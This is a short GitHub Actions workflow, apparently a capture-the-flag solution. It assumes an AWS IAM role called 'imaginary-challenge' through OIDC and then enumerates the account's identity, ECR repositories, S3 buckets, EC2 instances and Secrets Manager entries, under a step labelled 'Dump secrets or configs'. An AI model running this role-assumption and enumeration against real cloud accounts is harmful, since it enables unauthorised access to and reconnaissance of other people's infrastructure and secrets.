# .github/workflows/aws-access.yml
name: AWS OIDC Access

on:
  workflow_dispatch:

jobs:
  assume-role:
    runs-on: ubuntu-latest
    permissions:
      id-token: write   # Required for OIDC
      contents: read

    steps:
      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
          aws-region: us-east-1

      - name: Check AWS Identity
        run: aws sts get-caller-identity

      - name: List ECR Repositories
        run: aws ecr describe-repositories

      - name: Dump secrets or configs
        run: |
          aws s3 ls
          aws ec2 describe-instances
          aws secretsmanager list-secrets
